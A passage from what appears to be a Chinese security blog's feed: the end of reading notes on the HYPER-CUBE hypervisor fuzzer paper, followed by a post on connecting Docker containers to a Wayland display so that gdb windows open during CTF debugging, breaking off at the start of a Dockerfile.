Para-Virtualization</h3><p>虚拟机并不需要直接接触到实际的硬件，<em>半虚拟化</em> （para-virtualization）由此诞生，这种技术本质上需要我们去修改 OS，例如 VirtIO 便提供了一个统一的虚拟设备协议，OS 只需要实现一套虚拟设备驱动即可</p><p>现代的硬件加速的（hardware-accelerated）虚拟化则引入了新的指令叫 <code>hypercall</code>，用来主动触发 <code>VM-exit</code> 以实现一些任务（以 Intel 为例为 <code>vmcall</code> 指令）</p><h2 id="D-Fuzzing-Hypervisor"><a href="#D-Fuzzing-Hypervisor" class="headerlink" title="D. Fuzzing Hypervisor"></a>D. Fuzzing Hypervisor</h2><p>对 hypervisor 的 fuzzing 存在接口繁多、重启开销大的挑战，目前绝大部分研究来自工业界，例如 <a href="https://www.blackhat.com/docs/eu-16/materials/eu-16-Li-When-Virtualization-Encounters-AFL-APortable-Virtual-Device-Fuzzing-Framework-WithAFL-wp.pdf.">Tang</a> 实现了一个定制于 QEMU 的 SeaBIOS 的 AFL 扩展，学术界则仅有一个 VDF</p><h1 id="0x03-Design"><a href="#0x03-Design" class="headerlink" title="0x03. Design"></a>0x03. Design</h1><h2 id="A-Threat-Model"><a href="#A-Threat-Model" class="headerlink" title="A. Threat Model"></a>A. Threat Model</h2><p>攻击者有着对虚拟机的完全控制权，其目的为获取宿主机上其他虚拟机或是宿主机本身的控制权，DoS 攻击也纳入考虑 </p><h2 id="B-Challenge-in-Fuzzing-Hypervisors"><a href="#B-Challenge-in-Fuzzing-Hypervisors" class="headerlink" title="B. Challenge in Fuzzing Hypervisors"></a>B. Challenge in Fuzzing Hypervisors</h2><p>如图 2 所示，hypervisor 与 guest 间的交互接口众多，且非所有接口都有文档，需要 fuzzer 能实现与 hypervisor 间的有意义交互；VM 中系统启动过程也可能影响漏洞寻找过程，但重启系统耗时较长；硬件加速也可能带来不确定性</p><p><img src="https://s2.loli.net/2023/10/27/kqSU9gYXdzChcFe.png" alt="Fig. 2: High-level overview of the system architecture of HYPER-CUBE"></p><h2 id="C-Architecture"><a href="#C-Architecture" class="headerlink" title="C. Architecture"></a>C. Architecture</h2><h3 id="1-High-Level-Overview"><a href="#1-High-Level-Overview" class="headerlink" title="1) High-Level Overview"></a>1) High-Level Overview</h3><p>文章中的 fuzzer 包含如图 2 所示的三个主要组成部分：</p><ul><li><code>HYPER-CUBE OS</code> 在虚拟机内启动并枚举硬件接口，定制的系统使得我们对 VM 有着完全的控制权限</li><li>随后启动的用来 fuzz hypervisor 的字节码解释器 <code>TESSERACT</code></li><li>一组额外的工具，用于向 <code>TESSERACT</code> 提供字节码流、反编译执行的字节码程序、使用如串口等接口观测 hypervisor</li></ul><p>这样的架构允许我们实现上文所述的三个目标：</p><ul><li><code>High Performance Fuzzing</code>：客制操作系统 <code>HYPER-CUBE OS</code> 比 COTS（Commercial Off-The-Shelf） OS 更轻量级，从而在 crash 后能快速重启系统；编译执行程序进行 fuzz 也较耗时，因此作者使用自制的运行在 VM 中 ring0 的 <code>TESSERACT</code> 字节码解释器，以 <em>fuzzer-friendly</em> 的方式设计字节码：最大化产生有用指令的可能性、对内存地址不作为指针而是作为大小与偏移值进行编码（<code>TESSERACT</code> 会记录那些有趣的内存区域）；为了提高生成合理字节码的概率，所有参数都被映射到模范围中</li><li><code>Generic High-Dimensional Fuzzing</code>：现有的 hypervisor fuzzer 通常关注于某一接口，而 <code>TESSERACT</code> 则可以与所有可用接口交互</li><li><code>Stable and Deterministic Fuzzing</code>：此前的 hypervisor fuzzer 基于 COTS OS 从而引入了大量属于系统本身的不确定性，作者开发的操作系统 <code>HYPER-CUBE OS</code> 则以对环境的控制权避免了这个问题，且能进行一些有趣的操作</li></ul><h3 id="2-HYPER-CUBE-OS"><a href="#2-HYPER-CUBE-OS" class="headerlink" title="2) HYPER-CUBE OS"></a>2) HYPER-CUBE OS</h3><p>客制操作系统 <code>HYPER-CUBE OS</code> 为该 fuzzer 的核心，其实现了 <a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html">multiboot 2 规范</a>，并为我们的 fuzzer （<code>TESSERACT</code>）提供了一个通用平台，其有着两个主要任务：物理内存管理与设备枚举，前者需要管理所有的物理内存，后者则需要枚举 MMIO 与 port I&#x2F;O 的地址范围，并与 PIC&#x2F;APIC 交互，有的信息（如 MMIO 区域）通过 BIOS&#x2F;UEFI 传递，而有的信息（如 I&#x2F;O 端口与 PCI 设备）则又需要手动枚举</p><h3 id="3-TESSERACT"><a href="#3-TESSERACT" class="headerlink" title="3) TESSERACT"></a>3) TESSERACT</h3><p><code>HYPER-CUBE OS</code> 启动后会与 hypervisor 进行随机交互，这通过自定义字节码解释器 <code>TESSERACT</code> 定义，字节码可以来自于 VM 外，也可以来自于该解释器内置的伪随机数生成器，字节码的设计形式使得任意字节串都是一个合法程序</p><p>解释器解码时会将所有的值模到一个范围中，根据 opcode 调用不同的处理函数（进行单个&#x2F;多个动作）；解释器还维护一组单个为 4k 页的会被被定期覆盖为随机数据的 scratch 区域，这使得 <code>TESSERACT</code> 可以在其上创建自定义数据结构作为输入</p><h3 id="4-External-Tools"><a href="#4-External-Tools" class="headerlink" title="4) External Tools"></a>4) External Tools</h3><p>该 fuzzer 的最后一部分为运行在 host 侧的三个独立的辅助工具（通常在 fuzzing 之后使用）：</p><ul><li>logger 在 fuzzing 时岚姐 VM 的串口通信并存储以供后续分析</li><li>minimization tool 在找到 bug 后使用同样的种子重新生成程序并在随机移除部分段后观测结果，算法收敛后通常能获得包含数十条指令的程序，出于调试目的我们还可以将 <code>TESSERACT</code> 作为独立的 ring 3 程序运行</li><li>decompiler 将给定的（最小化）字节码转换为等价的 C 程序以分析找到漏洞的字节流程序，这样的 C 程序可以被编译为 HYPER-CUBE OS 的一个模块或是插入到 COTS OS 内核驱动中进行调试</li></ul><h1 id="0x04-Implementation-Details"><a href="#0x04-Implementation-Details" class="headerlink" title="0x04. Implementation Details"></a>0x04. Implementation Details</h1><blockquote><p>这一节很多基础知识，懒得摘抄太多了</p></blockquote><h2 id="A-HYPER-CUBE-OS"><a href="#A-HYPER-CUBE-OS" class="headerlink" title="A. HYPER-CUBE OS"></a>A. HYPER-CUBE OS</h2><h3 id="1-Boot-Process"><a href="#1-Boot-Process" class="headerlink" title="1) Boot Process"></a>1) Boot Process</h3><p>在启动阶段固件会从不同的外设（称为 Option ROMs）中载入程序以检测硬件并生成数据信息，随后加载 bootloader 以装载内核，multiboot 标准被制定来标准化 bootloader （并扩展至第二代以支持 UEFI）以在不同 BIOS&#x2F;UEFI 间通用，遵循 multiboot2 的内核可以被构建为 ELF 文件，<code>HYPER-CUBE OS</code> 便基于 multiboot2 规范并使用 GRUB 进行引导，从而使得其可以通过传统 BIOS 或 UEFI 固件进行启动，且在入口点便进入保护模式</p><ul><li><code>Initializing Interrupts</code>：<code>HYPER-CUBE OS</code> 会配置 PIC&#x2F;APIC 以初始化所有基本的中断&#x2F;异常的 handlers，并通过 masking OS 内的所有终端寄存器以屏蔽了所有外部中断，从而确保 fuzzing 过程不会被中断</li></ul><h3 id="2-Memory-Management"><a href="#2-Memory-Management" class="headerlink" title="2) Memory Management"></a>2) Memory Management</h3><p>作者实现了一个单次分配一整张页面的简易堆管理器，减少了内存碎片并提高了<del>撸棒</del>健壮性，实际上仅在枚举设备时 <code>HYPER-CUBE OS</code> 会为 <code>TESSERACT</code> 分配少量内存，因此额外开销可以忽略不计</p><p>现代操作系统通常使用分页机制支撑虚拟空间，但一些任务（如页表和 MMIO）需要直接访问物理内存，因此 <code>HYPER-CUBE OS</code> 维护一个一对一直接映射到物理内存的区域（<code>0x0 ~ 0x100000</code>），此外由 BIOS&#x2F;UEFI 传来的可用物理内存信息会被用作内核堆，最后 <code>HYPER-CUBE OS</code> 会创建另一个对 MMIO 区域的重映射，内存布局如图 3 所示：</p><p><img src="https://s2.loli.net/2023/10/27/EiusOdrowH4zgSp.png" alt="Fig. 3: Virtual memory layout of HYPER-CUBE"></p><h3 id="3-Device-Enumeration"><a href="#3-Device-Enumeration" class="headerlink" title="3) Device Enumeration"></a>3) Device Enumeration</h3><p>PCI 这样的硬件设备或是 APIC 或 高精确事件计时器（High Precision Event Timer，HPET）可以将内部寄存器映射到物理内存上，访问对应的 MMIO 区域则可以直接影响这些设备的状态，<code>HYPER-CUBE OS</code> 会枚举可用来 fuzzing 的不同接口，这需要枚举所有外设所用的 MMIO 及 port I&#x2F;O 地址</p><ul><li><code>Core Components</code>：由 APIC 或 HPET 提供的 MMIO 区域信息通过名为 <code>高级配置与电源接口</code> （Advanced Configuration and Power Interface，ACPI）表的形式进行描述，HPET 与 APIC MMIO 区域的基址存放在对应的 ACPI 表中（由 multiboot bootloader 提供），ACPI 表中所有的基址指针都在 <code>TESSERACT</code> 中注册为 fuzzing 目标地址</li><li><code>PCI-/PCIe-Enumeration</code>：<code>HYPER-CUBE OS</code> 依赖于传统 PCI 配置 I&#x2F;O 接口或基于位于增强配置机制（<code>Enhanced Configuration Mechanism</code>，ECAM）基指针的 MMIO 区域的现代 PCI 配置空间进行 PCI 设备枚举，ECAM 信息同样存放在 ACPI 表中</li><li><code>ISA-Enumeration / I/O Port Probing</code>：ISA 设备没有系统的枚举与检测的办法，因此 <code>HYPER-CUBE OS</code> 会对所有的 2<sup>16</sup> 个端口进行读写，发生改变的端口值则被认为是一个模拟设备</li></ul><h2 id="B-TESSERACT"><a href="#B-TESSERACT" class="headerlink" title="B. TESSERACT"></a>B. TESSERACT</h2><p><code>TESSERACT</code> 是一个复杂指令集解释器，总的来说实现了如下指令：</p><p><img src="https://s2.loli.net/2023/10/27/6qHpPGwKkvshNR1.png" alt="image.png"></p><p>字节流输入将被 <code>TESSERACT</code> 解码为不同的指令操作，在没有外部字节码流作为输入的情况下其使用伪随机数生成器来生成随机指令（如图 4 所示），在找到造成崩溃的初始 PRNG 状态后，作者使用相同的状态重新生成相同的字节串（可能长达数百万到数千万条指令），并将其嵌入到 <code>HYPER-CUBE OS</code> 镜像中进行引导，若依然崩溃则会随机删除 50% 指令片段并重复此过程以获取最小字节串，随后通过反汇编器转为人类可读的 C 程序形式</p><p><img src="https://s2.loli.net/2023/10/27/JYXaqnIbLVBEy12.png" alt="Fig. 4: TESSERACT consuming a byte string provided either by a PRNG or an embedded payload. Upon receiving the byte string, TESSERACT decodes it into opcodes such as 1 and 2 . It then calls the handler that actually performs I/O operations."></p><h1 id="0x05-Evaluation"><a href="#0x05-Evaluation" class="headerlink" title="0x05. Evaluation"></a>0x05. Evaluation</h1><p>作者希望能够回答以下四个研究问题：</p><ul><li>使用 <code>HYPER-CUBE</code> 是否能够在不同 hypervisor 中发现新的漏洞？</li><li>是否能重新发现那些已知的漏洞（如 QEMU 的 CVE-2015-3456）？</li><li>与其他的 hypervisor fuzzer 相比在覆盖率方面如何？</li><li>与其他的 hypervisor fuzzer 相比在性能方面如何？</li></ul><blockquote><p>贴几个表看看实力，具体的原文就不摘抄了，反正很强就对了，建议看原论文</p></blockquote><p><img src="https://s2.loli.net/2023/10/27/Rti6dTquacA9WJU.png" alt="TABLE II: Reported bugs found by HYPER-CUBE."></p><p><img src="https://s2.loli.net/2023/10/27/rFPLTHKihf8VZ2k.png" alt="TABLE III: Previously known vulnerabilities in QEMU / KVM found by HYPER-CUBE (average time in seconds over 20 runs each ± standard deviation)."></p><p><img src="https://s2.loli.net/2023/10/27/NsWtpZwlAk2xJ6L.png" alt="TABLE IV: Branch coverage and bugs found by HYPER-CUBE and VDF"></p><p><img src="https://s2.loli.net/2023/10/27/Mz5sy1NQApVh6OF.png" alt="TABLE V: Throughput of TESSERACT vs. GCC (with -O0)"></p><p><img src="https://s2.loli.net/2023/10/27/oUwZFAtBHdISCPy.png" alt="TABLE VI: Boot time comparison using QEMU 4.0.1-rc4 ASAN (average over 20 runs each ± standard deviation)."></p><p><img src="https://s2.loli.net/2023/10/27/evFjpUbtR9TmZLE.png" alt="TABLE VII: Automatic emulator detection rate of HYPER-CUBE. #scanning indicates the number of interfaces identified by our scanning. #well-known denotes the number of ports that the scanning did not find, but were contained in our list of well-known ports. #baseline is the number of interfaces, as reported by the hypervisor."></p><h1 id="0x06-Related-Work"><a href="#0x06-Related-Work" class="headerlink" title="0x06. Related Work"></a>0x06. Related Work</h1><p>过去的项目使用客制操作系统来测试 hypervisor，例如 <a href="https://github.com/airbus-seclab/crashos">CrashOS</a> 是包含了一组手写测试用例的 OS，但不提供发现新漏洞的方法；Intel CHIPSEC 套件则提供了不同的 fuzz 模拟设备的组件；Ormandy 则写了一个用于在不同 hypervisor 中创建随机 I&#x2F;O 访问的 <a href="https://www.semanticscholar.org/paper/An-Empirical-Study-into-the-Security-Exposure-to-of-Ormandy/b67dc496b84010aa4f2a0f909fb3cb4d36ba78a0">fuzzer</a>；Henderson 等人则提出了通过修改开源 hypervisor 并提供 AFL 支持来 fuzz 特定模拟设备的<a href="https://hhannuaa.github.io/papers/VDF_raid17.pdf">方法</a>；Tang 等人则通过[在 QEMU 的 SeaBIOS 上实现接口](<a href="https://www.blackhat.com/docs/eu-16/materials/">https://www.blackhat.com/docs/eu-16/materials/</a><br>eu-16-Li-When-Virtualization-Encounters-AFL-APortable-Virtual-Device-Fuzzing-Framework-WithAFL-wp.pdf)以提供 AFL 与 QEMU 间的互相操作性；来自 MWR Labs 和微软安全研究与防御部门的 Amardeep Chana 则引入了用于模糊测试 Hyper-V hypercall（VMBus）的<a href="https://labs.mwrinfosecurity.com/blog/venturesinto-hyper-v-part-1-fuzzing-hypercalls/">模糊测试工具</a>（附加<a href="https://blogs.technet.microsoft.com/srd/2019/01/28/fuzzing-para-virtualizeddevices-in-hyper-v/">链接</a>）</p><h1 id="0x07-Discussion"><a href="#0x07-Discussion" class="headerlink" title="0x07. Discussion"></a>0x07. Discussion</h1><p>这个工具很强大，但仍有一些可以提升的点</p><h2 id="A-Coverage-Guided-Hypervisor-Fuzzing"><a href="#A-Coverage-Guided-Hypervisor-Fuzzing" class="headerlink" title="A. Coverage-Guided Hypervisor Fuzzing"></a>A. Coverage-Guided Hypervisor Fuzzing</h2><p>与覆盖率信息进行结合可能会提高发现漏洞的概率，为了发现新的覆盖范围或有趣行为，需要逐步构建 hypervisor 中的状态，而可能的操作空间巨大，让状态增长到有趣的事情发生（如 crash）似乎会极大增加吞吐量</p><h2 id="B-Hyper-V"><a href="#B-Hyper-V" class="headerlink" title="B. Hyper-V"></a>B. Hyper-V</h2><p><code>HYPER-CUBE</code> 暂不支持 <code>Hyper-V</code> ，因为其不支持 64 位 UEFI 引导（<code>Hyper-V</code> 要求操作系统以此模式进行引导）；同时 HYPER-CUBE 对半虚拟化的支持有限，目前只实现了不太可能单独触发有趣覆盖的通用操作</p><h1 id="0x08-Conclusion"><a href="#0x08-Conclusion" class="headerlink" title="0x08. Conclusion"></a>0x08. Conclusion</h1><blockquote><p>没啥好说的</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;hyper 的 不是 visor，是我 cube 哒！&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="信息安全" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="FUZZ" scheme="https://arttnba3.github.io/tags/FUZZ/"/>
    
    <category term="论文笔记" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
    <category term="虚拟化" scheme="https://arttnba3.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="Qemu" scheme="https://arttnba3.github.io/tags/Qemu/"/>
    
  </entry>
  
  <entry>
    <title>【OPS.0x01】为 Docker 连接 Wayland 图形环境</title>
    <link href="https://arttnba3.github.io/2023/10/25/OPS-0X01-DOCKER_WAYLAND_GUI/"/>
    <id>https://arttnba3.github.io/2023/10/25/OPS-0X01-DOCKER_WAYLAND_GUI/</id>
    <published>2023-10-24T17:02:45.000Z</published>
    <updated>2024-02-22T19:31:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>这一日，Docker 再入桌面 GUI 境界</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><blockquote><p>如果你只是寻求 docker 接通 Wayland 跑图形界面的解决方案，不想看笔者吐槽的各种批话，请直接跳过这一小节 ：）</p><p>如果你想要的是 docker 接通显卡的解决方案，那你走错路了，这个方案在<a href="https://arttnba3.cn/2023/08/31/OPS-0X00-DOCKER_ON_SERVER/#0x02-%E5%88%9B%E5%BB%BA%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E6%98%BE%E5%8D%A1%E7%9A%84-docker-%E7%8E%AF%E5%A2%83">隔壁</a></p></blockquote><p>笔者大一刚开始学 Pwn 的时候就因环境问题而感到苦手，上一题的环境可能是 <code>Ubuntu 16.04</code> 带个 <code>glibc-2.23</code> 只有 <code>fastbin</code>，下一题可能又变成 <code>Ubuntu 18.04</code> 带个 <code>glibc-2.27</code> 又多一个 <code>tcache</code> ，然后笔者本地环境又是 <code>Ubuntu 20.04</code> 带个 <code>glibc-2.31</code> 的同时 <code>tcache</code> 又多带一个 key，对于那时候以 glibc heap 利用作为主流的 Pwn 题而言若是本地 libc 版本不同则根本没有办法很好地调试好打远程</p><p>通过 <code>LD_PRELOAD</code> 参数在程序执行前 <em>预先加载 libc</em> 或许某些程度上是一个可行的办法，至少 libc 大版本相同的情况下载入不同的小版本基本上是没问题的，但是由于不同系统环境中 ld 版本不同的缘故，对于跨 ld 版本加载不同版本的 libc 则又可能直接 segmentation fault 了</p><p>虽然 Linux 的用户环境并不似 Windows 那样有着强壮的二进制前向兼容性，但是用户环境依托于内核环境、依托于内核向用户态暴露的接口——系统调用，而这并不是会轻易发生变动以及兼容性破坏的一个东西，由此，通过<strong>重新开辟一个对应的新的用户环境的方式</strong>—— 即形如 <code>Docker</code> 这样的<strong>操作系统层上的虚拟化方案</strong>，我们便能非常简单地搭建不同的 Pwn 题所对应的原始环境</p><blockquote><p><del>当然，这里就不得不提<a href="https://arttnba3.cn/2021/05/20/PIECES-0X00-SHELL_OUTSIDE-0-LOST_UMBRELLA/#arttnba3-arttnba3-cn-x2F-cat-flag">某些连 libc 都不给的是人是鬼全靠猜的比赛</a>的含金量了</del></p></blockquote><p>但是 Docker 一直有一个问题就是<strong>默认是没有图形环境的</strong>，这意味着我们没法直接在 Docker 当中运行 GUI 程序，对于需要复杂堆风水等多次调试的 Pwn 题目而言则没办法像直接运行在主机上那样直接通过 <code>gdb.attach()</code> 弹一个伪终端窗口出来：</p><p><img src="https://s2.loli.net/2023/10/24/ogN4EqIUx9TVm6u.jpg" alt="感觉不如 lldb"></p><p><a href="https://github.com/tmux/tmux/wiki">TMUX</a> 为我们提供了一个比较好的 docker 中的多终端解决方案，当你在 tmux 中运行 exploit 执行到 <code>gdb.attach()</code> 这样需要一个新终端的命令时，tmux 可以无缝分割出一个新的窗口，通过额外指定 pwntools 中的 <code>context.terminal</code> 环境变量可以控制新窗口的分割位置：</p><p><img src="https://s2.loli.net/2023/10/24/i2XEPgZGlVse1W8.jpg" alt="是新终端吗？如新"></p><p>但是 tmux 的翻页手感终究是差点意思，不像图形化界面那样可以很方便地用滚轮滚来滚去，同时基于 GUI 窗口的跨行文本复制也会跨多个 tmux 窗口，打破了不同窗口的隔离性：</p><p><img src="https://s2.loli.net/2024/02/23/YJ6XD1qxU8jaVw2.png" alt="更重要的一点是笔者当时非常 sb 认为 tmux 不能翻页，后面才知道 ctrl+b 后按下 [ 就能通过 PgUp 和 PgDn 翻页]"></p><p>笔者当年的解决方案是直接开多个虚拟机，但用起来总感觉差点意思不说，还占用了大量的物理磁盘空间——笔者本科阶段前两年所用的电脑是<strong>机身只搭载了一块 512GB SSD 的 surface book 2</strong>——为什么这里要特别讲一下这个机型并不是因为笔者想要炫富，虽然说从价格而言 surface 系统产品和 MacBook 系列产品一样同属价格极高性价比极低的“高端产品”，但笔者当时是在某海鲜市场买的可能大于二手的机子，所以其实没有花太多钱，但和 MacBook 一样的是 surface 全系列产品<strong>没有办法自行更换包括内存与硬盘在内的任何部件</strong>，而即便是在海鲜市场寻宝的情况下笔者也买不起更大容量的版本，再加上笔者当时除了是个计算机科学爱好者以及网络空间安全专业本科生的身份以外还是半个画师加十六分之一个平面设计师（当然现在已经不是本科生了），装个 visual studio 加个 matlab 加上 jetbrains 全家桶再装个 adobe 半家桶（主要就用 PS 和 AI 还有个剪视频的叫啥👴已经记不得了）就已经把硬盘填得满满当当的了，各种杂七杂八的资料照片音乐视频啥的又要吃掉少说几十 GB，这个时候再塞几个平均十几 GB 的各种虚拟机（主力虚拟机所占用的硬盘空间超过100GB）无疑更是让本就不富裕的 <strong>512GB SSD</strong> 雪上加霜</p><blockquote><p>而笔者为什么选择买这样一台中看不中用的电脑是因为在初中的时候笔者看一本不知道叫啥的电子硬件相关的杂志中看到 <code>surface book</code> 的 <em>屏幕键盘可分离、独显放置在键盘中</em> 的这样一个前所未有的解决方案感到十分惊人加非常的帅气，于是就一直心心念念想要买一台这样的本子，高中时期笔者换过三台不同的平板电脑二合一产品（当然，都是从某海鲜市场淘来的，且基本上是卖了上一台才买下一台），其中第一台是 surface 3 而第三台是 surface pro 3，当时的主要用途是拿来日常刷刷 OI 、写点小说 <del>（那么这里就不得不简单帮忙推广一下某不知名墨姓作家所写的<a href="https://www.qidian.com/book/1027074530/">《从零开始的 CTFer 生活》</a> 这部小说了虽然一直在咕咕咕）</del> 玩一些轻量游戏，体感其实还行</p><blockquote><p>当然现在微软的 surface 系列产品已经能够初步地自行更换硬盘，虽然是充满槽点的 <code>2230</code> 规格，但是和隔壁某水果品牌相比已经好得不得了了</p><blockquote><p>但是各项性能又被隔壁秒成渣渣了，微软你在干什么啊微软（恼）</p><p><del>但其实仔细一想这不应该是Intel的锅么，wintel联盟依托答辩了👊</del></p></blockquote></blockquote><p>以及 surface 系统产品一直有一个噱头就是有个触控笔可以画画，也就是自带数位屏，这也是这个产品一直以来最吸引笔者的一点，虽然微软最初给大家呈上来的只是一坨闻着香吃着臭的答辩，但笔者一直希望随着产品不断迭代，微软能够把这个功能给真正做好，就算达不到 wacom 上万块钱的数位屏相的高度至少也要和国产的一千出头的数位屏掰个手腕的程度，可惜<strong>哪怕是一直到今天最新的 surface pro 9 这一代产品，其绘画手感依旧比不过几千块钱的 iPad ，甚至比不过200块出头的国产数位板</strong>（当然笔者只买了 surface pro 8 没有买 surface pro 9 因为微软非常 SB 地把 3.5mm 耳机接口这个天顶星科技给砍掉了并且性能和续航和 8 代相比并没有什么提升简而言之又是挤牙膏的一代，但笔者有去微软线下门店亲自尝试过最新一代，绘画手感依旧一坨答辩）</p></blockquote><p>虽然 surface book 2 无法更换硬盘的特性让笔者非常痛苦，但仔细想来还是老罗的那句名言——<code>又不是不能用</code>，硬盘空间想办法腾一腾多开好几个虚拟机其实没什么不好，毕竟省去了折腾 docker 的麻烦就一万个值，于是笔者日渐习惯每天在不同虚拟机之间跳来跳去</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231125222853.png" alt="你知道我要说什么.png"></p><p>不过这个问题并没有折磨笔者太长的时间，在玩了将近一个学期的用户态 Pwn 学了各种不同的 house 之后笔者感觉 glibc pwn 在技术上基本上已经玩不出什么新的有意思的花样了，于是选择了 all in Linux kernel pwn，只需要用 QEMU 去跑虚拟机，gdb 可以直接连上 QEMU 的端口进行调试，也不依赖于某些特定的 glibc 环境（虽然后面玩虚拟机逃逸又用到了不过这是后话了），于是当初搭建的几个用户态 Pwn 环境的虚拟机就慢慢用不到了， <em>现在已经被笔者逐一打包扔到备份硬盘当中</em></p><p>而在 2023 年的今天，笔者又想趁着闲暇时间再业余小玩一下用户态的 Pwn（比赛大概率不一定会专门打了，最多就看到 corCTF 这样的优质比赛会去做做他们的内核题，一些比较有意思的的用户态 Pwn 题最多可能赛后会复现之类的），那么环境以及各种 libc（包括 glibc 、tclibc、musl，<del>👴其实没想明白 musl 为啥会在 CTF 里流行起来，是没活了🐎</del>）又重新变为笔者需要面对的问题之一，而彼时同时跑好几个虚拟机的解决方案未免太过于小丑🤡，因此笔者决定找到一个能够在 docker 当中执行 <code>gdb.attach()</code> 时直接在宿主机中弹出一个窗口的办法</p><blockquote><p>写了这么多没用的批话，突然感觉这一篇其实应该放到 <a href="https://arttnba3.cn/categories/PIECES/">PIECES</a> 分类 而非 <a href="https://arttnba3.cn/categories/OPS/">OPS</a> ，但仔细想想其实笔者真正要讲的核心内容其实是 docker 的一个小知识，所以还是放 OPS 分类下或许会更加合适一些</p></blockquote><h1 id="0x01-为-Docker-接入-Wayland-环境"><a href="#0x01-为-Docker-接入-Wayland-环境" class="headerlink" title="0x01. 为 Docker 接入 Wayland 环境"></a>0x01. 为 Docker 接入 Wayland 环境</h1><blockquote><p>笔者所用的图形服务为 Wayland，因此本篇不会讲 X11 该怎么配置（毕竟已经有很多讲这个的<a href="https://gist.github.com/turekt/71f6950bc9f048daaeb69479845b672b">文章</a>了，<del>，以及都什么年代了还在用传统图形服务</del>）</p></blockquote><p>配置的办法其实很简单，我们只需要在启动容器时额外添加一些参数即可，下面是一个简单的例子：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker build -t pwnenv_ubuntu20 .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d -p <span class="hljs-string">&quot;2222:22&quot;</span> \</span><br><span class="language-bash">--name=pwnenv_ubuntu20 \</span><br><span class="language-bash">-e XDG_RUNTIME_DIR=/tmp \</span><br><span class="language-bash">-e DISPLAY=<span class="hljs-variable">$DISPLAY</span> \</span><br><span class="language-bash">-e WAYLAND_DISPLAY=<span class="hljs-variable">$WAYLAND_DISPLAY</span> \</span><br><span class="language-bash">-v <span class="hljs-variable">$XDG_RUNTIME_DIR</span>/<span class="hljs-variable">$WAYLAND_DISPLAY</span>:/tmp/<span class="hljs-variable">$WAYLAND_DISPLAY</span> \</span><br><span class="language-bash">-e QT_QPA_PLATFORM=wayland \</span><br><span class="language-bash">pwnenv_ubuntu20</span><br></code></pre></td></tr></table></figure><blockquote><p><del>别问👴这些参数是什么意思，自己查嗷</del></p></blockquote><p>启动之后容器其实就完成对 Wayland 服务的接入了，这里我们简单写一个 QT 小程序看看实力：</p><p><img src="https://s2.loli.net/2023/10/25/bsER7NLVfD3Oq28.png" alt="libEGL 的报错懒得管了，反正日常使用没啥影响"></p><p>现在我们的 docker 就已经成功接入 Host 侧的图形服务了：）</p><h1 id="0x02-让-gdb-attach-弹出一个新的图形窗口"><a href="#0x02-让-gdb-attach-弹出一个新的图形窗口" class="headerlink" title="0x02. 让 gdb.attach() 弹出一个新的图形窗口"></a>0x02. 让 gdb.attach() 弹出一个新的图形窗口</h1><p>这个其实也很简单，笔者用的是 KDE 桌面，所以先在容器里装一个 <code>konsole</code> ，如果你用的是 Gnome 则可以装个 <code>gnome-terminal</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install konsole</span><br></code></pre></td></tr></table></figure><p>之后在 pwntools 调用 gdb 之前将全局变量 <code>context.terminal</code> 的值设为如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">context.terminal = [<span class="hljs-string">&#x27;konsole&#x27;</span>, <span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>]<br></code></pre></td></tr></table></figure><p>之后就能像调试本地原生进程那样在调试 docker 里的进程的时候弹出一个新的 gdb 图形窗口了 ：）</p><p><img src="https://s2.loli.net/2023/10/25/fKS5bQUizjakCAr.jpg" alt="yattaze"></p><h1 id="0xFF-What’s-more…"><a href="#0xFF-What’s-more…" class="headerlink" title="0xFF. What’s more…"></a>0xFF. What’s more…</h1><p>最后给出一个笔者自用的开箱即用的 docker pwn 环境的 Dockerfile，有需要的可以自取：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 